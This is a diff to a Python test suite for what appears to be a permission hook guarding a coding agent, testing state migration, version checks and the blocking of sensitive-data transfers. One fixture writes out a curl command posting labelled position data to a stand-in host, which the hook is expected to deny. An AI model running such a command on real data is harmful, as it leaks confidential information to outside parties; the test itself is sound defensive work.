@@ -4,8 +4,10 @@
 from __future__ import annotations
 
 import hashlib
+import inspect
 import json
 import os
+import re
 import shutil
 import subprocess
 import sys
@@ -83,6 +85,25 @@ class HookProtocolTests(unittest.TestCase):
         self.session = "test-session"
         self.turn = "test-turn"
         self.tool_sequence = 0
+
+    def test_event_internal_signatures_are_atomic(self) -> None:
+        module = __import__("control_plane_hook")
+        expected = {
+            "_scan_text": ("text",),
+            "_scan_command": ("command",),
+            "_scan_tool_output": ("event", "text"),
+            "_prepare_isolated_git_push": ("object_dir", "object_format", "environment", "token"),
+            "_is_external_tool": ("tool_name", "tool_input"),
+            "dispatch": ("event",),
+        }
+        for name, parameters in expected.items():
+            with self.subTest(name=name):
+                signature = inspect.signature(getattr(module, name))
+                self.assertEqual(parameters, tuple(signature.parameters))
+        required_parameter = inspect.signature(
+            module._prepare_isolated_git_push
+        ).parameters["token"]
+        self.assertIs(inspect.Parameter.empty, required_parameter.default)
 
     def run_raw(self, payload: str, *, data_dir: str | None = None) -> tuple[subprocess.CompletedProcess[str], dict]:
         env = os.environ.copy()
@@ -901,19 +922,36 @@ class HookProtocolTests(unittest.TestCase):
         self.assertEqual(original, state_path.read_bytes())
         self.assertEqual([], list(Path(self.data_dir).glob(".*.tmp")))
 
-    def test_legacy_state_is_migrated_to_current_schema(self) -> None:
-        digest = hashlib.sha256(self.session.encode("utf-8")).hexdigest()[:24]
-        state_path = Path(self.data_dir) / f"session-{digest}.json"
-        state_path.write_text(
-            json.dumps({"schema_version": 1, "active_agents": {}, "updated_at": int(time.time())}),
-            encoding="utf-8",
-        )
+    def test_legacy_state_schemas_are_migrated_to_current_schema(self) -> None:
+        for schema_version in (1, 2, 3):
+            with self.subTest(schema_version=schema_version):
+                session = f"{self.session}-schema-{schema_version}"
+                digest = hashlib.sha256(session.encode("utf-8")).hexdigest()[:24]
+                state_path = Path(self.data_dir) / f"session-{digest}.json"
+                state_path.write_text(
+                    json.dumps(
+                        {
+                            "schema_version": schema_version,
+                            "active_agents": {},
+                            "updated_at": int(time.time()),
+                        }
+                    ),
+                    encoding="utf-8",
+                )
 
-        self.assertEqual({}, self.bash("pwd"))
+                result = self.run_hook(
+                    {
+                        "hook_event_name": "PreToolUse",
+                        "tool_name": "Bash",
+                        "tool_input": {"command": "pwd"},
+                        "session_id": session,
+                    }
+                )
 
-        state = json.loads(state_path.read_text(encoding="utf-8"))
-        self.assertEqual(4, state["schema_version"])
-        self.assertIn("pending_permission_authorizations", state)
+                self.assertEqual({}, result)
+                state = json.loads(state_path.read_text(encoding="utf-8"))
+                self.assertEqual(4, state["schema_version"])
+                self.assertIn("pending_permission_authorizations", state)
 
     def test_malformed_state_fails_closed_without_replacement(self) -> None:
         digest = hashlib.sha256(self.session.encode("utf-8")).hexdigest()[:24]
@@ -1123,9 +1161,22 @@ class HookProtocolTests(unittest.TestCase):
                     )
                 self.assertEqual("deny", result["hookSpecificOutput"]["permissionDecision"])
 
-    def test_public_plugin_version_remains_v0_2_6(self) -> None:
-        manifest = json.loads((SCRIPTS.parent / ".codex-plugin" / "plugin.json").read_text(encoding="utf-8"))
-        self.assertEqual("0.2.6", manifest["version"])
+    def test_public_plugin_version_matches_changelog_and_readme(self) -> None:
+        root = SCRIPTS.parents[2]
+        manifest = json.loads(
+            (SCRIPTS.parent / ".codex-plugin" / "plugin.json").read_text(encoding="utf-8")
+        )
+        version = manifest["version"]
+        self.assertRegex(version, r"^\d+\.\d+\.\d+$")
+        released = re.findall(
+            r"^## \[(\d+\.\d+\.\d+)\]",
+            (root / "CHANGELOG.md").read_text(encoding="utf-8"),
+            re.MULTILINE,
+        )
+        self.assertEqual([version], released[:1])
+        readme = (root / "README.md").read_text(encoding="utf-8")
+        self.assertIn(f"--ref v{version}", readme)
+        self.assertNotIn("--ref main", readme)
 
     def test_windows_launcher_is_manifest_only(self) -> None:
         powershell_launcher = (SCRIPTS / "run_control_plane_hook.ps1").read_text(encoding="utf-8")
@@ -6739,6 +6790,20 @@ class HookProtocolTests(unittest.TestCase):
                 with mock.patch.object(module.os.path, "expanduser", return_value=expanded_home):
                     self.assertFalse(module._is_profile_persistence_redirection_target(target))
 
+    def test_bare_publication_words_are_not_durable_destinations(self) -> None:
+        module = __import__("control_plane_hook")
+        for text in (
+            "public",
+            "publish",
+            "marketplace",
+            "src/public/index.html",
+            "ls -la src/public",
+            "git commit -m 'publish docs'",
+            "docs/republished.md",
+        ):
+            with self.subTest(text=text):
+                self.assertFalse(module._is_durable_destination(text))
+
     def test_external_command_detection_uses_command_fields_only(self) -> None:
         module = __import__("control_plane_hook")
         content = (
@@ -6814,6 +6879,66 @@ class HookProtocolTests(unittest.TestCase):
                 },
             )
         )
+
+    def test_sensitive_prose_and_publication_words_do_not_create_transfer_gates(self) -> None:
+        self.prompt("Process Example Capital position data locally.")
+        events = [
+            {
+                "tool_name": "Bash",
+                "tool_input": {"command": "rg 'position: TEST_POSITION_041' src/public/index.html"},
+            },
+            {
+                "tool_name": "Bash",
+                "tool_input": {"command": "rg 'position: TEST_POSITION_042' docs/republished.md"},
+            },
+            {
+                "tool_name": "Bash",
+                "tool_input": {"command": "printf 'position: TEST_POSITION_043 marketplace'"},
+            },
+        ]
+        for index, event in enumerate(events, start=1):
+            with self.subTest(event=event):
+                self.turn = f"surface-negative-{index}"
+                result = self.run_hook({"hook_event_name": "PreToolUse", **event})
+                self.assertNotEqual(
+                    "deny",
+                    result.get("hookSpecificOutput", {}).get("permissionDecision"),
+                )
+
+    def test_sensitive_real_external_commands_and_durable_destinations_remain_blocked(self) -> None:
+        self.prompt("Process Example Capital position data locally.")
+        events = [
+            {
+                "tool_name": "Bash",
+                "tool_input": {
+                    "command": "curl -sS -d 'position: TEST_POSITION_045' https://example.invalid"
+                },
+            },
+            {
+                "tool_name": "Bash",
+                "tool_input": {
+                    "command": (
+                        "rg 'position: TEST_POSITION_046' "
+                        "/tmp/project/.codex/memories/note.md"
+                    )
+                },
+            },
+            {
+                "tool_name": "exec_command",
+                "tool_input": {
+                    "cmd": "printf 'position: TEST_POSITION_048'",
+                    "workdir": "/tmp/private-notes/",
+                },
+            },
+        ]
+        for index, event in enumerate(events, start=1):
+            with self.subTest(event=event):
+                self.turn = f"surface-positive-{index}"
+                result = self.run_hook({"hook_event_name": "PreToolUse", **event})
+                self.assertEqual(
+                    "deny",
+                    result["hookSpecificOutput"]["permissionDecision"],
+                )
 
     def test_event_budget_bounds_hanging_git_children_and_fails_closed(self) -> None:
         module = __import__("control_plane_hook")
